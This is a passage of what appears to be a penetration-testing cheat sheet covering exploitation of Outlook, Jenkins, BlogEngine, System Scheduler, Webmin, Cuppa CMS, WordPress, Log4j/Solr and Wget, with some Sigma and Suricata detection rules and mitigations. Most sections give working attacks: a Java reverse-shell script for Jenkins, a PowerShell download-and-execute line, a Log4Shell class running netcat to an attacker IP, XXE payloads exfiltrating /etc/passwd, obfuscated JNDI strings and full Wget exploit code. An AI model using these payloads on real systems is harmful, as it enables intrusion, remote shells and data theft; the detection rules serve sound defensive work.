C:\Users\Administrator\Desktop\> Send-CalendarNTLMLeak -recipient "test@test.com" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "Meeting" -meetingbody "This is just a regular meeting invitation :)"
```

**Detection and mitigation**

**Sigma Rules**

The following Sigma rule detects Outlook initiating a connection to a WebDav or SMB share, indicating a post-exploitation phase. \[1]

```
title: CVE-2023-23397 Exploitation Attempt
id: 73c59189-6a6d-4b9f-a748-8f6f9bbed75c
status: experimental
description: Detects outlook initiating connection to a WebDAV or SMB share, which
  could be a sign of CVE-2023-23397 exploitation.
author: Robert Lee @quantum_cookie
date: 2023/03/16
references:
- https://www.trustedsec.com/blog/critical-outlook-vulnerability-in-depth-technical-analysis-and-recommendations-cve-2023-23397/
tags:
- attack.credential_access
- attack.initial_access
- cve.2023.23397
logsource:
  service: security
  product: windows
  definition: 'Requirements: SACLs must be enabled for "Query Value" on the registry
    keys used in this rule'
detection:
  selection:
    EventID:
    - 4656
    - 4663
    ProcessName|endswith: \OUTLOOK.EXE
    Accesses|contains: Query key value
    ObjectName|contains|all:
    - \REGISTRY\MACHINE\SYSTEM
    - Services\
    ObjectName|endswith:
    - WebClient\NetworkProvider
    - LanmanWorkstation\NetworkProvider
  condition: selection
falsepositives:
- Searchprotocolhost.exe likes to query these registry keys. To avoid false postives,
  it's better to filter out those events before they reach the SIEM
level: critical
```

\[2] This sigma rules looks to detect svchost.exe spawning rundll32.exe with command arguments like `C:\windows\system32\davclnt.dll,DavSetCookie`, which indicates a post-exploitation/exfiltration phase. `https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml`

```
title: Suspicious WebDav Client Execution
id: 982e9f2d-1a85-4d5b-aea4-31f5e97c6555
status: experimental
description: 'Detects "svchost.exe" spawning "rundll32.exe" with command arguments
  like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of
  exfiltration or use of WebDav to launch code (hosted on WebDav Server) or potentially
  a sign of exploitation of CVE-2023-23397

  '
references:
- https://twitter.com/aceresponder/status/1636116096506818562
- https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/
- https://www.pwndefend.com/2023/03/15/the-long-game-persistent-hash-theft/
author: Nasreddine Bencherchali (Nextron Systems), Florian Roth (Nextron Systems)
date: 2023/03/16
tags:
- attack.exfiltration
- attack.t1048.003
- cve.2023.23397
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: \svchost.exe
    Image|endswith: \rundll32.exe
    CommandLine|contains: C:\windows\system32\davclnt.dll,DavSetCookie
    CommandLine|re: ://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
  filter_local_ips:
    CommandLine|contains:
    - ://10.
    - ://192.168.
    - ://172.16.
    - ://172.17.
    - ://172.18.
    - ://172.19.
    - ://172.20.
    - ://172.21.
    - ://172.22.
    - ://172.23.
    - ://172.24.
    - ://172.25.
    - ://172.26.
    - ://172.27.
    - ://172.28.
    - ://172.29.
    - ://172.30.
    - ://172.31.
    - ://127.
    - ://169.254.
  condition: selection and not 1 of filter_*
falsepositives:
- Unknown
level: high
```

The below powershell script will check the Exchange messaging items like Mail, calendar,  and tasks to see if the IOCs related to the CVE-2023-23397 attack are found.  The script can be used to audit and clean the detected items.

```
https://microsoft.github.io/CSS-Exchange/Security/CVE-2023-23397/
```

You can also follow below steps to avoid and mitigate against this vulnerability

```
-   Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.
-   Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.
-   Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.
-   Disable WebClient service to avoid webdav connection.
```

### Jenkins Automation Server

#### What is Jenkins

From Wikipedia

```
Jenkins is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration, and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.
```

Official Website

```
https://www.jenkins.io/
```

#### Impact

Successful exploitation of this vulnerability leads to establishing first foothold access with shell access.

#### Exploitation With Metasploit

The below module is used to exploit vulnerable versions of Jenkins and return a Meterpreter shell.

```
use exploit/multi/http/jenkins_script_console
```

Modify the below parameters according to your environment

```
msf exploit(jenkins_script_console) > set rhost 192.168.1.106 

msf exploit(jenkins_script_console) > set rport 8484 

msf exploit(jenkins_script_console) > set targeturi / 

msf exploit(jenkins_script_console) > set target 0 

msf exploit(jenkins_script_console) > exploit
```

#### Exploitation With Groovy Shell

If you managed to get access to Jenkins dashboard, then at Jenkins Dashboard

* Go to **Manage Jenkins** and then select **Script Console**.
* Once inside the script console, we can paste the below. Make sure to change the port to the port you are using in your listener and localhost to the machine that will receive the connection

```powershell
String host="localhost";

int port=8044;

String cmd="cmd.exe";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();

while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();
po.flush();
Thread.sleep(50);
try {p.exitValue();
break;
}
catch (Exception e){}};
p.destroy();
s.close();
```

Alternatively if you want to use Powershell then you can let Jenkins download Powershell reverse shell from your machine and execute it on the target. First download the script from below link

```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

then use the below command with python to host it on your machine

```
python3 -m http.server
```

And lastly paste the below in the script console and don't forget to change the parameters to fit your scenario

```powershell
_powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_
```

### BlogEngine.Net Blogging Platform

#### Definition

BlogEngine is platform to create and build blogs using .NET framework

#### Impact

Successful exploitation of this vulnerability leads to establishing first foothold access with shell access.

#### Manual Exploitation

**CVE-2019-6714** `Affected Versions`: 3.3.6 and below One of the most popular vulnerabilities out there. The exploit is found in the link below

```
https://www.exploit-db.com/exploits/46353
```

* Download the exploit and modify the IP/PORT to correspond to the ones of your machine.
* After you have downloaded the script, rename it so that the extension is `ascx`.
* Run the listener on your machine

```
nc -lvp 4545
```

* Then login to the blog engine administrator console and go to file manager and upload the script.

### Splinterware System Scheduler

#### Definition

From the official website

```
System Scheduler is an excellent tool to schedule unattended running of applications, batch files, scripts and much more.  
  
For anyone used to using MS Windows own Task Scheduler, System Scheduler is an ideal and easy to use replacement, with great flexibility and features. System Scheduler runs totally independently of the MS Windows Task Scheduler and has no dependencies on it.
```

Official URL

```
https://www.splinterware.com/products/scheduler.html
```

If installed on a Windows OS, it will run `WScheduler.exe` as a service and can be seen when enumerating services.

#### Impact

Successful exploitation of this vulnerability leads to elevated privileges to SYSTEM in Windows OS.

#### Manual Exploitation

`Affected Versions`: Pro 5.12 Exploit URL

```
https://www.exploit-db.com/exploits/45072
```

* Navigate to `C:\Program Files (x86)\SystemScheduler` and go to `Events` and read through the log files. Try to find the name of the executable that is running in regular intervals.
* After your find the name of the executable, lets say it's `runme.exe`
* Create a reverse shell using Msfvenom and name it `runme.exe`
* Rename the original `runme.exe` into `runme.bak` and transfer the reverse shell you generated and store it under `C:\Program Files (x86)\SystemScheduler`
* Lastly wait for the service to execute the reverse shell and you will receive the connection in your listener

### Webmin

#### Definition

Webmin is a server management control panel that allows administrator to manage Linux operating systems and configure settings.

#### Impact

Successful exploitation of this vulnerability leads to establishing first foothold access with shell access.

#### Exploitation

Webmin has many common vulnerabilities that you can find on the web along with publicly available exploits. **Version 1.580 and before** Exploit URL

```
https://www.exploit-db.com/exploits/21851
```

This exploit requires authenticated access to the Webmin admin console to succeeed. With Metasploit, we can use the below module

```
msf > use exploit/unix/webapp/webmin_show_cgi_exec
```

### Cuppa CMS

#### Definition

Cuppa is a content management system used to create and manage content Official URL

```
cuppacms.com
```

#### Impact

Successful exploitation of this vulnerability leads to reading local files on the system. Additionally the attacker can include remote files to establish reverse shells.

#### Manual Exploitation

Exploit URL

```
https://www.exploit-db.com/exploits/25971
```

* Run a listener on your machine

```
nc -lvp 4545
```

* Start a python server to host a php reverse shell

```
python -m http.server
```

* Trigger the target server to request the PHP reverse shell from your machine using the below link. Adjust below as needed.

```
http://target- ip/administrator/alerts/alertConfigField.php?urlConfig=http://attacker-ip:attacker-port/revshell.php
```

#### Elementor

**Elementor Plus Addons <= 4.1.6 - CVE 2021-24175**

**IOCs**

* Check for new registered users with email addresses as their username
* Check for new plugins labeled wih 'wpstaff'

**Mitigation and Patching**

* Delete the plugin or deactivate it if you are unable to update
* Best practice is to update the plugin.

#### Wordpress

**CVE-2021-29447**

**Impact**

**Arbitrary File Disclosure**: The contents of any file on the host’s file system could be retrieved, e.g. _wp-config.php_ which contains sensitive data such as database credentials. **Server-Side Request Forgery (SSRF)**: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.

**Requirements**

**Authenticated access to wordpress** **Permissions to upload to the media library**

**Exploitation**

Create a poc.wav file with the below content. Remember to put your ip and port below.

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/poc.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Create poc.dtd with the content below.Remember to put your ip and port below.

```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">  
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Give poc.wav execute permissions and run it

```
chmod +x poc.wav
/poc.wav
```

This will create a file called payload.wav Fire a web server and host both poc.dtd and poc.wav in it

```
php -S 0.0.0.0:PORT
```

Upload payload.wav to the media library. This will fetch the poc.dtd which in turn will retrieve the content of /etc/passwd encoded in base64 You should have the base64 encoded string appear in the web server interactive log in your command line To decode the returned base64, create a file named decode.php with below content

```
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

Be sure to replace \['base64here'] with the base64 you received. You will decode the string and retrieve the content of the /etc/passwd. Now you can replace \[/etc/passwd] in the dtd file to any file you want to see the content of such as wp-config.php.

**Reverse Shell Without Vulnerability Exploitation**

If you got authenticated admin access to Wordpress dashboard and found that its current version not to be vulnerable, you can then edit any `.php` file whether theme files or Wordpress installation files and paste any `php reverse shell` to establish a foothold.

#### Apache Web Server

**Log4j Vulnerability CVE-2021-44228**

**Affected versions**

```
Apache Log4j2 < 2.15.0
```

**Attack surface and affected products**

```
https://github.com/YfryTchsGD/Log4jAttackSurface
https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592
```

**Detection** It depends on the product which is using the log4j logging package. See affected products in the link above. I will try to list as many examples as I can for each product. **Detection using Yara rules** Find details on that using the below repo.

```
https://github.com/darkarnium/CVE-2021-44228
```

**Detection using Using powershell**

```
https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1
```

**Detection using by comparing hashes of vulnerable log4j class files**

```
https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228

https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d
```

**Detection using by comparing hashes of vulnerable log4j jar files**

```
https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes
```

**Detection using a python tool against any running HTTP Server**

```
https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
```

**Detection using a scanner written in Go**

```
https://github.com/hillu/local-log4j-vuln-scanner
```

**Detection using BurpSuite**

```
https://github.com/silentsignal/burp-log4shell
```

**Detection using Nmap scripting engine**

```
https://github.com/Diverto/nse-log4shell
```

**Detection using Splunk**

**Detect scanning**

The below query takes into consideration that the \[user-agent] field where the payload is injected.

```
sourcetype=bro:http:json user_agent=${jndi:*}
| stats sparkline values(user_agent) count by src_ip, dest_ip, dest_port
```

Additionally, we can search for the string generally

```
index=* ${jndi:*}
```

**Detection using Suricata IDS**

**Detecting exploitation attempts.**

```
alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:ldap://"; fast_pattern:only; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:web-application-attack; priority:3; reference:url, [http://www.lunasec.io/docs/blog/log4j-zero-day/](http://www.lunasec.io/docs/blog/log4j-zero-day/); metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003726; rev:1;) 

alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; pcre:"/\$\{jndi\:(rmi|ldaps|dns)\:/"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:web-application-attack; priority:3; reference:url, [http://www.lunasec.io/docs/blog/log4j-zero-day/](http://www.lunasec.io/docs/blog/log4j-zero-day/); metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003728; rev:1;) 

alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (CVE-2021-44228)"; flow:established, to_server; content:"${jndi:"; fast_pattern; content:!"ldap://"; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:web-application-attack; priority:3; reference:url, [http://www.lunasec.io/docs/blog/log4j-zero-day/](http://www.lunasec.io/docs/blog/log4j-zero-day/); reference:url, twitter.com/stereotype32/status/1469313856229228544; metadata:CVE 2021-44228; metadata:created_at 2021-12-10; metadata:ids suricata; sid:21003730; rev:1;) 


alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Defense-Evasive Apache Log4J RCE Request Observed (URL encoded bracket) (CVE-2021-44228)"; flow:established, to_server; content:"%7bjndi:"; nocase; fast_pattern; flowbits:set, fox.apachelog4j.rce; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:web-application-attack; priority:3; reference:url, [http://www.lunasec.io/docs/blog/log4j-zero-day/](http://www.lunasec.io/docs/blog/log4j-zero-day/); reference:url, [https://twitter.com/testanull/status/1469549425521348609](https://twitter.com/testanull/status/1469549425521348609); metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003731; rev:1;) 


alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header"; flow:established, to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; flowbits:set, fox.apachelog4j.rce.loose; classtype:web-application-attack; priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, [http://www.lunasec.io/docs/blog/log4j-zero-day/](http://www.lunasec.io/docs/blog/log4j-zero-day/); reference:url, [https://twitter.com/testanull/status/1469549425521348609](https://twitter.com/testanull/status/1469549425521348609); metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003732; rev:1;) 

alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI"; flow:established,to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; flowbits:set, fox.apachelog4j.rce.loose; classtype:web-application-attack; priority:3; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url, [http://www.lunasec.io/docs/blog/log4j-zero-day/](http://www.lunasec.io/docs/blog/log4j-zero-day/); reference:url, [https://twitter.com/testanull/status/1469549425521348609](https://twitter.com/testanull/status/1469549425521348609); metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; sid:21003733; rev:1;)

# Better and stricter rules, also detects evasion techniquesalert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in HTTP Header (strict)"; flow:established,to_server; content:"${"; http_header; fast_pattern; content:"}"; http_header; distance:0; pcre:/(\$\{\w+:.*\}|jndi)/Hi; xbits:set, fox.log4shell.attempt, track ip_dst, expire 1; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:web-application-attack; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,[https://twitter.com/testanull/status/1469549425521348609](https://twitter.com/testanull/status/1469549425521348609); metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003734; rev:1;) 


alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in URI (strict)"; flow:established, to_server; content:"${"; http_uri; fast_pattern; content:"}"; http_uri; distance:0; pcre:/(\$\{\w+:.*\}|jndi)/Ui; xbits:set, fox.log4shell.attempt, track ip_dst, expire 1; classtype:web-application-attack; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,[https://twitter.com/testanull/status/1469549425521348609](https://twitter.com/testanull/status/1469549425521348609); metadata:CVE 2021-44228; metadata:created_at 2021-12-11; metadata:ids suricata; priority:3; sid:21003735; rev:1;) 


alert http any any -> $HOME_NET any (msg:"FOX-SRT – Exploit – Possible Apache Log4j Exploit Attempt in Client Body (strict)"; flow:to_server; content:"${"; http_client_body; fast_pattern; content:"}"; http_client_body; distance:0; pcre:/(\$\{\w+:.*\}|jndi)/Pi; flowbits:set, fox.apachelog4j.rce.strict; xbits:set,fox.log4shell.attempt,track ip_dst,expire 1; classtype:web-application-attack; threshold:type limit, track by_dst, count 1, seconds 3600; reference:url,www.lunasec.io/docs/blog/log4j-zero-day/; reference:url,[https://twitter.com/testanull/status/1469549425521348609](https://twitter.com/testanull/status/1469549425521348609); metadata:CVE 2021-44228; metadata:created_at 2021-12-12; metadata:ids suricata; priority:3; sid:21003744; rev:1;)
```

**Detecting scanning attempts**

```
# Possible successful interactsh probe alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"FOX-SRT – Webattack – Possible successful InteractSh probe observed"; flow:established, to_client; content:"200"; http_stat_code; content:"<html><head></head><body>"; http_server_body; fast_pattern; pcre:"/[a-z0-9]{30,36}<\/body><\/html>/QR"; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:misc-attack; reference:url, github.com/projectdiscovery/interactsh; metadata:created_at 2021-12-05; metadata:ids suricata; priority:2; sid:21003712; rev:1;) 


alert dns $HOME_NET any -> any 53 (msg:"FOX-SRT – Suspicious – DNS query for interactsh.com server observed"; flow:stateless; dns_query; content:".interactsh.com"; fast_pattern; pcre:"/[a-z0-9]{30,36}\.interactsh\.com/"; threshold:type limit, track by_src, count 1, seconds 3600; reference:url, github.com/projectdiscovery/interactsh; classtype:bad-unknown; metadata:created_at 2021-12-05; metadata:ids suricata; priority:2; sid:21003713; rev:1;)


# Detecting DNS queries for dnslog[.]cn alert dns any any -> any 53 (msg:"FOX-SRT – Suspicious – dnslog.cn DNS Query Observed"; flow:stateless; dns_query; content:"dnslog.cn"; fast_pattern:only; threshold:type limit, track by_src, count 1, seconds 3600; classtype:bad-unknown; metadata:created_at 2021-12-10; metadata:ids suricata; priority:2; sid:21003729; rev:1;)


# Connections to requestbin.net alert dns $HOME_NET any -> any 53 (msg:"FOX-SRT – Suspicious – requestbin.net DNS Query Observed"; flow:stateless; dns_query; content:"requestbin.net"; fast_pattern:only; threshold:type limit, track by_src, count 1, seconds 3600; classtype:bad-unknown; metadata:created_at 2021-11-23; metadata:ids suricata; sid:21003685; rev:1;) 


alert tls $HOME_NET any -> $EXTERNAL_NET 443 (msg:"FOX-SRT – Suspicious – requestbin.net in SNI Observed"; flow:established, to_server; tls_sni; content:"requestbin.net"; fast_pattern:only; threshold:type limit, track by_src, count 1, seconds 3600; classtype:bad-unknown; metadata:created_at 2021-11-23; metadata:ids suricata; sid:21003686; rev:1;)
```

**Detecting exploitation attempts**

```
# Detects possible successful exploitation of Log4j# JNDI LDAP/RMI Request to External alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"FOX-SRT – Exploit – Possible Rogue JNDI LDAP Bind to External Observed (CVE-2021-44228)"; flow:established, to_server; dsize:14; content:"|02 01 03 04 00 80 00|"; offset:7; isdataat:!1, relative; threshold:type limit, track by_src, count 1, seconds 3600; classtype:bad-unknown; priority:1; 
metadata:created_at 2021-12-11; sid:21003738; rev:2;) 

alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"FOX-SRT – Exploit – Possible Rogue JRMI Request to External Observed (CVE-2021-44228)"; flow:established, to_server; content:"JRMI"; depth:4; threshold:type limit, track by_src, count 1, seconds 3600; classtype:bad-unknown; priority:1; reference:url, [https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html](https://docs.oracle.com/javase/9/docs/specs/rmi/protocol.html); metadata:created_at 2021-12-11; sid:21003739; rev:1;) 


# Detecting inbound java shortly after exploitation attempt alert tcp any any -> $HOME_NET any (msg: "FOX-SRT – Exploit – Java class inbound after CVE-2021-44228 exploit attempt (xbit)"; flow:established, to_client; content: "|CA FE BA BE 00 00 00|"; depth:40; fast_pattern; xbits:isset, fox.log4shell.attempt, track ip_dst; threshold:type limit, track by_dst, count 1, seconds 3600; classtype:successful-user; priority:1; metadata:ids suricata; metadata:created_at 2021-12-12; sid:21003741; rev:1;)
```

**Apache solr**

In apache solr, the log files are stored in the below location

```
/var/solr/logs
```

And if you visit the admin page of apache solr of your installation you will see that

```
-Dsolr.log.dir = /var/solr/logs
```

This indicates where logs are saved. Attackers payloads appear in a log file named \[solr.log]. If you opened the file and noticed lines similar to the below ones then it means attackers are trying to exploit it

```
2021-12-14 07:55:06.155 INFO  (qtp1008315045-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.118.124:4545}} status=0 QTime=0

2021-12-14 07:55:45.868 INFO  (qtp1008315045-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0

2021-12-14 07:56:33.501 INFO  (qtp1008315045-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.118.124:4545}} status=0 QTime=0

2021-12-14 07:57:31.728 INFO  (qtp1008315045-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.166.62:4545}} status=0 QTime=0

2021-12-14 07:58:17.003 INFO  (qtp1008315045-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0

2021-12-14 08:12:47.288 INFO  (qtp1008315045-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.166.62:1389/Exploit}} status=0 QTime=1

2021-12-14 08:14:02.628 INFO  (qtp1008315045-23) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.166.62:1389/Exploit}} status=0 QTime=0

2021-12-14 08:17:34.503 INFO  (qtp1008315045-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.10.166.62:1389/Exploit}} status=0 QTime=0

```

As you can see requests go to \[/solr/admin/cores] followed by a parameter that uses the \[jndi] to communicate via \[ldap] with the attacker \[LDAP referral server].

**Apache solr POC**

Step one: Installing Java \[1.8.0\_181] on your machine. This is done by downloading the package from below URL

```
http://mirrors.rootpei.com/jdk/
file: jdk-8u181-linux-x64.tar.gz
```

Step two: Installation Apply the below command so that your OS uses this java version.

```
sudo mkdir /usr/lib/jvm

cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz     

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1

sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1

sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java

sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac

sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

Step three: Installing the \[marshalsec] utility so you can host an \[ldap server] that redirects requests to your web server that will host the payload

```
git clone https://github.com/mbechler/marshalsec
sudo apt install maven
mvn clean package -DskipTests
```

Step four: Starting the \[LDAP server]

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-ip:8000/#Log4j"
```

Step five: preparing a \[java reverse shell] and hosting it in the web server. Below is a simple java reverse shell code

```java
public class Exploit { static { try { java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999"); } catch (Exception e) { e.printStackTrace(); } } }
```

Save it as \[Log4j.java] and compile it like below

```
javac Log4j.java
```

Step six: hosting your payload and starting your listener

```
python3 -m http.server
```

and start the listener

```
nc -lnvp 4545
```

Step seven: sending the exploit

```
curl 'http://target-ip:8983/solr/admin/cores?foo=$\{jndi:ldap://your-ip:1389/Log4j\}'
```

**Encoding the payload**

You may need to test your firewall or IDS for detection of the above payload. You can also use various forms of the above payload for further testing your security devices in catching and spotting the exploit.

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}

${${::-j}ndi:rmi://attackerendpoint.com/}
```

**Mitigation**

Set either of the below properties to \[true]

```
log4j2.formatMsgNoLookups
LOG4J_FORMAT_MSG_NO_LOOKUPS
```

Or simply delete \[JndiLookup.class] for any version.

**Apache solr**

Navigate to the below file

```
/etc/default/solr.in.sh
```

add the below syntax to the end of the file

```
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
```

and restart

```
sudo /etc/init.d/solr restart
```

**AWS WAF**

In Amazon, navigate to Web ACLs > WAF and enable

```
AWS-AWSManagedRulesKnownBadInputsRuleSet
```

**Patching**

The Log4j logging package should be updated and patched to version \[2.15.0rc2] or \[2.16.0]

```
https://logging.apache.org/log4j/2.x/download.html
```

Patching tools

```
https://github.com/corretto/hotpatch-for-apache-log4j2
https://github.com/apache/logging-log4j2
https://github.com/nccgroup/log4j-jndi-be-gone
```

#### Wget

**CVE-2016-4971**

**Exploit link**

```
https://www.exploit-db.com/exploits/40064
```

**Exploit code**

```python
#!/usr/bin/env python

#
# Wget 1.18 < Arbitrary File Upload Exploit
# Dawid Golunski
# dawid( at )legalhackers.com
#
# http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt
#
# CVE-2016-4971 
#

import SimpleHTTPServer
import SocketServer
import socket;

class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       # This takes care of sending .wgetrc

       print "We have a volunteer requesting " + self.path + " by GET :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"
       self.send_response(301)
       new_path = '%s'%('ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST, FTP_PORT) )
       print "Sending redirect to %s \n"%(new_path)
       self.send_header('Location', new_path)
       self.end_headers()

   def do_POST(self):
       # In here we will receive extracted file and install a PoC cronjob

       print "We have a volunteer requesting " + self.path + " by POST :)\n"
       if "Wget" not in self.headers.getheader('User-Agent'):
	  print "But it's not a Wget :( \n"
          self.send_response(200)
          self.end_headers()
          self.wfile.write("Nothing to see here...")
          return

       content_len = int(self.headers.getheader('content-length', 0))
       post_body = self.rfile.read(content_len)
       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)

       print "Sending back a cronjob script as a thank-you for the file..." 
       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"
       self.send_response(200)
       self.send_header('Content-type', 'text/plain')
       self.end_headers()
       self.wfile.write(ROOT_CRON)

       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"

       return

HTTP_LISTEN_IP = '192.168.57.1' # change this
HTTP_LISTEN_PORT = 80 # change this
FTP_HOST = '192.168.57.1' # change this
FTP_PORT = 21 # change this

ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n" # change this

handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print "Ready? Is your FTP server running?"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)
else:
   print "FTP is down :( Exiting."
   exit(1)

print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT

handler.serve_forever()
```

